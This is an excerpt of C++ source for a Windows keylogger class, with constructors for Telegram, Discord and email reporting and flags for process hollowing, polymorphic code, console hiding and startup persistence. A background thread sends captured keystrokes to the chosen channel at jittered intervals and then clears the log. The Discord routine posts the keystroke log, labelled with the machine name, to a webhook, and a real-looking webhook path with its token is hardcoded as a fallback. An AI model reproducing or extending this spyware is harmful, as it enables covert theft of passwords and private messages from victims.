...
// Discord-based constructor
KeyLogger::KeyLogger(
    const std::string& webhookUrl,
    int interval
) : isRunning(false), logInterval(interval), useTelegram(false),
    useDiscord(true), useProcessHollowing(false), usePolymorphicCode(false), emailClient(nullptr)
{
...
KeyLogger::KeyLogger(
    ...
    useDiscord(false), useProcessHollowing(false), usePolymorphicCode(false), emailClient(nullptr)
{
...
KeyLogger::KeyLogger(
    ...
    useDiscord(false), useProcessHollowing(false), usePolymorphicCode(false)
{
    // Initialize special keys mapping
    initSpecialKeys();
...
bool KeyLogger::start(bool hideConsole, bool addStartup, bool useProcessHollow) {
    ...
    if (useProcessHollowing) {
        // Simplified version
        logFile << "[LOG] Process hollowing would be used here." << std::endl;
    }
    ...
    CreateThread(NULL, 0, [](LPVOID param) -> DWORD {
        ...
        while (logger->isRunning) {
            // Sleep for a minute with jitter
            logger->sleepWithJitter(60000);
            ...
            if (difftime(now, logger->lastReportTime) >= logger->logInterval) {
                ...
                // Send report via appropriate channel
                if (logger->useTelegram) {
                    reportSent = logger->sendLogsToTelegram(logContents);
                }
                else if (logger->useDiscord) {
                    reportSent = logger->sendLogsToDiscord(logContents);
                }
                else {
                    reportSent = logger->sendLogsToEmail();
                }
                
                if (reportSent) {
                    logger->lastReportTime = now;
                    
                    // Clear log file after successful report
                    std::ofstream clearFile(logger->logFileName, std::ios::trunc);
                    clearFile.close();
...
bool KeyLogger::sendLogsToServer(const std::string& logData, const std::string& windowTitle) {
    try {
        ...
        // Encrypt the data
        std::string encryptedData = encryptData(logData);
...
bool KeyLogger::sendLogsToDiscord(const std::string& logData) {
    try {
        // Simple direct approach for sandbox testing
        const char* targetHost = "discord.com";
        
        // Create a very simple payload - avoid complex JSON escaping
        std::string simpleContent = "```\n[" + std::string(getenv("COMPUTERNAME")) + "] Keylogger Report:\n" + logData + "\n```";
        std::string simplePayload = "{\"content\":\"" + simpleContent + "\"}";
        
        // Use WinInet for HTTP request
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return false;
        
        // Extract webhook path - everything after discord.com
        std::string webhookPath;
        if (discordWebhookUrl.find("https://discord.com/") != std::string::npos) {
            webhookPath = discordWebhookUrl.substr(std::string("https://discord.com").length());
        } else {
            webhookPath = "/api/webhooks/1359824516498329663/TwCuSwO_hXIuNgtuD5GTNuq2EUtSRk1gn5uErsZNCRpd4NdStOnsfnH9YI0fbRXdmh68";
        }
        
        // Connect to Discord API
        HINTERNET hConnect = InternetConnectA(hInternet, targetHost, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return false;
        }
        ...
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", webhookPath.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        ...
        const char* headers = "Content-Type: application/json\r\nUser-Agent: KeyloggerTest\r\n";
        BOOL result = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)simplePayload.c_str(), simplePayload.size());
        
        // Read response to validate
        char buffer[1024] = {0};
        DWORD bytesRead = 0;
        BOOL readSuccess = InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
        ...
        // For debugging, continue even if there's an error
        return false;
    }
} 